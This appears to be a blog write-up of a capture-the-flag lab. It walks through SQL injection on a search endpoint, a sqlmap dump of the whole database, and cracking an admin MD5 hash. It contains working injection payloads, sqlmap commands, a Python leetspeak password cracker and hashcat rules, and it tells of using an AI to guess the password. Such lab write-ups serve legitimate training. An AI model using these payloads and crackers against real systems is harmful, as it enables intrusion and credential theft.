# :game_die: Pre-compute total combinations for progress bar

---

## 2. From SQL Injection to Admin Access → Breaking Authentication Logic

>

After successfully exploiting the debug panel, I shifted focus to the next objective.

*At this point, I already had:*

- Valid session access (`guest`)

- Full API visibility

- Multiple internal endpoints

- A strong hint that authentication and data handling might be weak

>

Instead of guessing credentials, I targeted the application logic itself.

### Step 1: Testing for Injection Points

*The endpoint:*

```
/api/users/search?q=
```

looked like a perfect candidate.

## Get The.Flying.Wolf’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

*Using the authenticated session:*

```
curl -b cookies.txt "http://ctf.ine.local:8080/api/users/search?q=1"
```

Normal queries returned empty results.

*Then I tested input handling:*

```
curl -b cookies.txt -G --data-urlencode "q=' OR 1=1-- -" "http://ctf.ine.local:8080/api/users/search"
```

### What Happened

The application returned:

- All users

- Including the admin account

This confirmed:

- Input was not sanitized

- Backend query was injectable

- Authentication-related data could be exposed

>

This is a classic SQL Injection vulnerability.

### Step 2: Initial Database Enumeration Attempt (sqlmap)

### Step 3: Automating the Exploitation (sqlmap)

*To fully extract the database, I used:*

```
sqlmap -u "http://ctf.ine.local:8080/api/users/search?q=guest" --cookie="connect.sid=$(grep connect.sid cookies.txt | awk '{print $7}')" --batch --dbms=SQLite --dump-all
```

## What the Dump Revealed

The database contained multiple tables:

At this point, this was no longer just user data, this was internal infrastructure-level information.

## Sensitive Data Extracted

### 1. Internal Config

- Internal API token

- Metadata service endpoint

- Debug header (`X-Auth-Debug`)

- Registry URL

### 2. Secrets

While analyzing the `secrets` table, something stood out:

```
FLAG{BR0K3N_ACC3SS_CTRL_SSRF_2025}
```

This was clearly another flag.

However, this raised an important point.

### 3. Projects Table

This one was interesting.

Inside `private_notes`, developers had left internal comments like:

- Use of internal metadata service

- Token stored in `internal_config`

- Warning about exposed `.git`

- Suspicious package in internal registry

This is exactly how real environments leak context — not through code, but through developer notes.

### 4. Users Table

- Admin account identified

- Password stored as MD5 hash

- Weak password hints exposed

## Cracking the Admin Hash → The Hardest 68 Hours

After dumping the database, everything looked straight forward at first.

I had:

- Admin username

- MD5 hash

- A very specific hint

```
Company codename + weather event + year + special char (leet speak)
```

>

It looked solvable, It wasn’t.

### The Target

From the `users` table:

```
admin → 1791169e0c31824bfbe719a60bc779e0
```

Other users were easy:

- sarah.chen → `sarah123`

- mike.johnson → `Welcome1!`

- guest → `guest`

But admin… was different.

### Phase 1: Standard Cracking Attempts (Failed)

*I started with the usual:*

- Wordlists

- Rule-based mutations

- Hashcat brute force

*Then moved deeper:*

- Custom wordlists (Company codename + weather event + year + special char)

- Leetspeak transformations

- Hybrid attacks

Nothing worked.

### Phase 2: Smarter Wordlist Generation (Still Failed)

*I refined the logic based on the hint:*

- Company codenames (top 100)

- Weather events (storm, cyclone, hurricane, etc.)

- Years (2020–2026)

- Special characters

- Partial leetspeak

*Tried:*

- `cewl` to generate context-based words

- Custom combinations

- Pattern-based brute force

Still nothing.

### Phase 3: Resource Exhaustion

*At this point:*

- Crunch-based brute force → lab crashed

- Local work server → estimated months to crack

- Optimization attempts → minimal improvement

And honestly…

I ran out of caffeine too.

### The Break

I stepped away.

Went out with a friend. Food. Coffee. Reset.

We started talking about:

- Work

- Security

- Then… prompt injection

And suddenly a thought clicked:

>

*Why am I brute forcing this… ?*

### Phase 4: Thinking Differently

Instead of treating it like a hash problem, I treated it like a human pattern prediction problem.

I gave a very specific prompt to AI based on:

- The hint

- Context of the environment

- Naming patterns used in VulnCorp

And in literally 20 second…

>

It returned a password.

No code.
No brute force.
Just the answer.

### The Moment

>

I was shocked.
Closed everything.
Rushed back.
Tested the password.
It worked.

### Admin Credentials

```
admin : N3xus$torm2025!
```

### What This Actually Means

This wasn’t about cracking power.

*This was about:*

- Understanding patterns

- Thinking like a developer

- Breaking out of brute-force mindset

### Custom Python Script for Pattern-Based Password Generation

```
import hashlib
import itertools
import time
import sys

target = "1791169e0c31824bfbe719a60bc779e0"

leet_map = {
'a': ['a', '4'], 'b': ['b', '8'], 'c': ['c', '('], 'd': ['d'],
'e': ['e', '3'], 'f': ['f'], 'g': ['g', '6'], 'h': ['h', '#'],
'i': ['i', '1'], 'j': ['j'], 'k': ['k', 'x'], 'l': ['l', '1'],
'm': ['m'], 'n': ['n'], 'o': ['o', '0'], 'p': ['p'], 'q': ['q'],
'r': ['r', '2'], 's': ['s', '5', '$'], 't': ['t', '7'], 'u': ['u'],
'v': ['v'], 'w': ['w'], 'x': ['x'], 'y': ['y', '7'], 'z': ['z', '2'],
}

def leet_variants(word):
options = [leet_map.get(c, [c]) for c in word.lower()]
for combo in itertools.product(*options):
yield ''.join(combo)

codenames = ["aurora","titan","phoenix","cobalt","falcon","viper",
"atlas","orion","hydra","storm","zeus","apollo","nexus",
"nova","cipher","eclipse","omega","alpha","delta","sigma",
"phantom","ghost","shadow","razor","raven","iron","steel",
"volt","blaze","surge"]

weather = ["storm","hurricane","tornado","thunder","blizzard",
"typhoon","cyclone","lightning","flood","hail",
"monsoon","drizzle","frost","avalanche","sandstorm"]

specials = ["!", "@", "#", "$", "%", "&", "*", "?", "-", "_"]
years = [str(y) for y in range(2020, 2027)]

# Pre-compute total combinations for progress bar
total_outer = len(codenames) * len(weather) * len(specials) * len(years)
done = 0
count = 0
found = False
start_time = time.time()
last_print = 0

def print_progress(done, total, count, start_time, suffix=""):
pct = done / total
bar_len = 40
filled = int(bar_len * pct)
bar = "█" * filled + "░" * (bar_len - filled)
elapsed = time.time() - start_time
speed = count / elapsed if elapsed > 0 else 0
eta = (total - done) / (done / elapsed) if done > 0 else 0
sys.stdout.write(
f"\r[{bar}] {pct*100:5.1f}% | "
f"Tried: {count:,} | "
f"Speed: {speed:,.0f}/s | "
f"Elapsed: {elapsed:.1f}s | "
f"ETA: {eta:.1f}s {suffix}"
)
sys.stdout.flush()

for c, w, s, year in itertools.product(codenames, weather, specials, years):
done += 1
for leet_c in leet_variants(c):
for leet_w in leet_variants(w):
attempts = [
leet_c + leet_w + year + s,
leet_c.capitalize() + leet_w.capitalize() + year + s,
leet_c.upper() + leet_w.upper() + year + s,
]
for attempt in attempts:
count += 1
if hashlib.md5(attempt.encode()).hexdigest() == target:
elapsed = time.time() - start_time
print_progress(done, total_outer, count, start_time)
print(f"\n\n[+] CRACKED: {attempt}")
print(f" Hash: {target}")
print(f" Tried: {count:,} combinations")
print(f" Time: {elapsed:.3f}s")
found = True
break
if found: break
if found: break

# Update progress bar every 0.1s
now = time.time()
if now - last_print >= 0.1:
print_progress(done, total_outer, count, start_time)
last_print = now

if found:
break

if not found:
elapsed = time.time() - start_time
print_progress(total_outer, total_outer, count, start_time)
print(f"\n\n[-] Not found. Tried {count:,} combinations in {elapsed:.3f}s")
```

### Fixed Leetspeak Hashcat Rule for Password Cracking

```
## Minimal Leet Speak Rules for Hashcat

## Basic single chars
sa4
sa@
sb6
sc9
sd0
se3
sg9
sh#
si1
so0
so$
sp9
sS5
sS$
st7
sy7
sz2

## Essential 2-char combos
sa@se3
sa@si1
sa@so0
sa@sS$
se3si1
se3so0
se3sS$
si1so0
si1sS$
so0sS$
so0so$
sS5sS$

## Essential 3-char combos
sa@se3si1
sa@se3so0
sa@se3sS$
sa@si1so0
sa@si1sS$
sa@so0sS$
se3si1so0
se3si1sS$
se3so0sS$
si1so0sS$

## Essential 4-char combos
sa@se3si1so0
sa@se3si1sS$
sa@se3so0sS$
sa@si1so0sS$
se3si1so0sS$

## Critical 5-char combo
sa@se3si1so0sS$
```

---
